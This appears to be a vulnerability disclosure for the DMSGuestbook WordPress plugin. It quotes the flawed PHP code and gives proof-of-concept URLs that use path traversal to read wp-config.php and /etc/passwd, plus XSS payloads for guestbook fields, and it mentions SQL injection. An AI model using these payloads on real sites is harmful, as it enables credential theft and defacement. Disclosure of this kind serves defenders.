1) File Disclosure

Open the following url you can see the config data of wordpress, with the
mysql-server username and password. In this file you usually have write
permission, so an attacker can place his deface page here:

http://site.tld/wordpress/wp-admin/admin.php?page=dmsguestbook&advanced=1&folder=language/&file=../../../../wp-config.php

Vuln code:
Line: 652-655
$handle = fopen ($abspath . "wp-content/plugins/dmsguestbook/" .
$_REQUEST[folder] . $_REQUEST[file], "r");
	if(is_writable($abspath . "wp-content/plugins/dmsguestbook/" .
$_REQUEST[folder] . $_REQUEST[file])) {
	echo "<br />$_REQUEST[file] <font style='color:#00bb00;'>is
writable!</font><br />Set $file readonly again when your finished to
customize!";


$_REQUEST[folder] & $_REQUEST[file] doesn't checked.



Another PoC:
http://localhost/xampp/wordpress/wp-admin/admin.php?page=dmsguestbook&advanced=1&folder=language/&file=../../../../../../../../../../../../../../../../etc/passwd

Ok, for this you need an admin account, but you can get an admin account with
the follow xss vulnerabilities.

2) Cross-Site Scripting Vulnerabilities

a) If the script doesn't find the file, php shows an errormessage, so for xss
open this:


http://site.tldwordpress/wp-admin/admin.php?page=dmsguestbook&advanced=1&folder=language/&file=<script>alert("XSS")</script>

b) Another vulnerability:

Find the guestbook page. In the messagefield write &lt;/textarea&gt;[your xss code].
So, if admin go to the admin panel, to show himself the guestbook, he execute
your xss code

c) Again in the guestbook

Enter your message in the title ">[xss]  and in the messagearea:
&lt;/textarea&gt;[xss] and enter a wrong captcha-code, you execute the xss code




Note: There more some more XSS-Vuln's.

3) SQL-Injection Vulnerabilities

There are some SQL-Injection vulnerabilites, but an attacker need an admin
account and if he is in the administration-panel, a sql-injection he not
need.
